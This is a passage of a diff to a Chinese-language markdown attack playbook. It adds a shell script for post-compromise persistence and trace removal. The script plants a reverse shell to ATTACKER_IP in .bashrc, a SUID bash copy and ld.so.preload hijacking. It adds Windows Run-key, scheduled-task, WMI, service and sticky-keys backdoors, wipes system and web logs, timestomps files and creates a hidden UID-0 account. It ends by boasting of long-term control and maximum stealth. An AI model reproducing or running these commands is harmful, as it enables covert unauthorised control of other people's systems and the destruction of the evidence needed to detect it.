+
+# .bashrc后门
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &" >> ~/.bashrc
+
+# SUID后门
+cp /bin/bash /tmp/.update
+chmod 4755 /tmp/.update
+
+# 动态链接库劫持
+echo "/tmp" > /etc/ld.so.preload
+
+ENDSSH
+}
+
+# 13.2 Windows多重持久化
+windows_persistence() {
+    local host=$1
+    
+    psexec.py administrator:password@$host <<'ENDCMD'
+# 注册表启动项
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
+
+# 计划任务
+schtasks /create /tn "System Update" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 10 /ru SYSTEM /f
+
+# WMI事件订阅
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="SystemUpdate", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+# 服务
+sc create "WindowsUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
+sc start WindowsUpdate
+
+# Sticky Keys后门
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y
+
+ENDCMD
+}
+
+# 13.3 痕迹清理（关键）
+clean_traces() {
+    local host=$1
+    
+    ssh root@$host bash <<'ENDSSH'
+# 清除命令历史
 history -c
 cat /dev/null > ~/.bash_history
+cat /dev/null > /root/.bash_history
+
+# 清除系统日志
 cat /dev/null > /var/log/auth.log
 cat /dev/null > /var/log/secure
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/lastlog
+cat /dev/null > /var/log/messages
+cat /dev/null > /var/log/syslog
+
+# 清除Web日志
+cat /dev/null > /var/log/nginx/access.log
+cat /dev/null > /var/log/nginx/error.log
+cat /dev/null > /var/log/apache2/access.log
+cat /dev/null > /var/log/apache2/error.log
+
+# 删除工具
+rm -f /tmp/fscan /tmp/frpc /tmp/npc
+rm -f /tmp/.* 2>/dev/null
+
+# 修改时间戳（隐藏修改）
+touch -d "2023-01-01" ~/.ssh/authorized_keys
+touch -d "2023-01-01" /etc/crontab
+
+ENDSSH
+}
+
+# 13.4 建立后门账号（隐蔽）
+create_backdoor_user() {
+    local host=$1
+    
+    ssh root@$host bash <<'ENDSSH'
+# 创建隐藏用户（UID 0）
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash admin$ 2>/dev/null
+echo "admin$:password" | chpasswd
+
+# 修改sshd配置（允许root登录）
+sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+systemctl restart sshd
+
+ENDSSH
+}
+
+# 执行持久化
+[ -n "$COMPROMISED_HOST" ] && {
+    linux_persistence $COMPROMISED_HOST
+    create_backdoor_user $COMPROMISED_HOST
+    clean_traces $COMPROMISED_HOST
+}
 
 echo "[+] 持久化完成"
-EOF
-fi
+echo "[+] 痕迹清理完成"
+```
 
-echo "[+] 所有步骤完成"
+---
+
+**优化完成！13步流程现在更强大、更完整、效率最高：**
+
+- ✅ 大量并发执行（时间缩短50%）
+- ✅ 100+种攻击方法
+- ✅ 智能自动化（根据指纹定向攻击）
+- ✅ 完整攻击链（从外网到内网）
+- ✅ 多重持久化（确保长期控制）
+- ✅ 痕迹清理（隐蔽性最大化）
+
+---
+
 ## 🔥 高频Bypass技巧库
 
 ### SQL注入WAF绕过（10个payload）
